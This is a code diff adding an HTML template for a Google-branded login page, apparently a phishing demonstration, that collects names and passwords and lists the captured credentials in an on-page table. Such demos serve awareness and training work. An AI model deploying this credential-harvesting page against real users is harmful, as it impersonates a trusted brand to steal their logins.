@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing</title>
+
+    <link rel="stylesheet" href="/static/bootstrap.css">
+    <link rel="stylesheet" href="/static/main.css">
+    
+</head>
+<body id="phishing_body">
+    <nav class="navbar navbar-expand-lg bg-light" data-bs-theme="light">
+        <div class="container-fluid">
+          <a class="navbar-brand" href="#">Google</a>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarColor03" aria-controls="navbarColor03" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+          <div class="collapse navbar-collapse" id="navbarColor03">
+            <ul class="navbar-nav me-auto">
+              <li class="nav-item">
+                <a class="nav-link active" href="#">Home
+                  <span class="visually-hidden">(current)</span>
+                </a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Microsoft Updates</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Microsoft Learn</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Microsoft Teams</a>
+              </li>
+
+            </ul>
+            <form class="d-flex">
+              <input class="form-control me-sm-2" type="search" placeholder="Search">
+              <button class="btn btn-secondary my-2 my-sm-0" type="submit">Search</button>
+            </form>
+          </div>
+        </div>
+      </nav>
+
+
+      <h1 id="google_header">Google</h1>
+
+      <br><br>
+
+      <form action="phishing" method="post">
+
+        <br>
+
+        <label for="phishing_name_form">Name:</label>
+        <input type="text" id="phishing_name_form" name="phishing_name" placeholder="Name" autocomplete="off">
+
+        <br><br>
+
+        <label for="phishing_password_form">Password</label>
+        <input type="text" id="phishing_password_form" name="phishing_password" placeholder="Password" autocomplete="off">
+
+        <br><br>
+
+        <button type="submit" id="button_phishing" class="btn btn-info">Submit</button>
+      </form>
+
+      <br><hr>
+
+<h2 style="color: black;">Data Being Stored:</h2>
+
+{% if phisher %}
+
+<div>
+<table id="phishing_table">
+  <tr>
+    <th>Username:</th>
+    <th>Password:</th>
+  </tr>
+  {% for row in rows %}
+  <tr>
+    <td>{{ row[0] }}</td>
+    <td>{{ row[1] }}</td>
+  </tr>
+  {% endfor %}
+</table>
+</div>
+{% else %}
+<!-- Display something if phisher is not true -->
+..
+{% endif %}
+
+
+</body>
+</html>
